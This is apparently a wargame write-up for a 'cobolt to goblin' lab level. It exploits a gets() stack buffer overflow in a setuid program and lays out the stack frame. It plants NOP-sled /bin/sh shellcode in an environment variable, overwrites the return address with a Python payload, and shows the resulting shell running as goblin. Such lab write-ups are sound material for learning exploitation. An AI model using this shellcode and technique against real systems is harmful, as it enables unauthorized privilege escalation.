# Vulnerability
In cobolt's home directory, There is a file named as goblin, and C code is provided, too.

Little difference is strcpy() changed to gets().
```c
char buffer[16];
gets(buffer);
```
gets() function doesn't check parameter's length so I can overwrite SFP & RET Address.

# Exploitation
To check whether dummy bytes exist or not, disassemble cobolt's main function:
```assembly
0x80483f8 <main>:	push   %ebp
0x80483f9 <main+1>:	mov    %esp,%ebp
0x80483fb <main+3>:	sub    $0x10,%esp
```
It only uses ```0x10```(16) bytes, No any dummy bytes.

Then, the structure of cobolt would be like:
```
---------------------------------
| buffer[16] | SFP[4] | RET[4] |
---------------------------------
```

I will write NOP & Shellcode into Environment Variable and write the variable's address into RET Address.

To get the address, write a simple C code:
```c
#include <stdio.h>
int main(void) {
        printf("Address of SHELLCODE: 0x%x\n", getenv("SHELLCODE"));
}
```

Export environment variable, compile c code, get SHELLCODE's address:
```bash
[cobolt@localhost cobolt]$ export SHELLCODE="`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`"
[cobolt@localhost cobolt]$ 
[cobolt@localhost cobolt]$ gcc -o ./getsh ./getsh.c
[cobolt@localhost cobolt]$ ./getsh 
Address of SHELLCODE: 0xbffffe6b
[cobolt@localhost cobolt]$ 
```

```
---------------------------------------------
| NOP[16] | SFP[4] | RET[4] (env's address) |
---------------------------------------------
```

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 16
payload = payload + "AAAA" # SFP
payload = payload + "\x6b\xfe\xff\xbf" # RET

print payload
```

```bash
[cobolt@localhost cobolt]$ (python ./exploit.py ;cat)|./goblin 
AAAAkþÿ¿
id     
uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
```
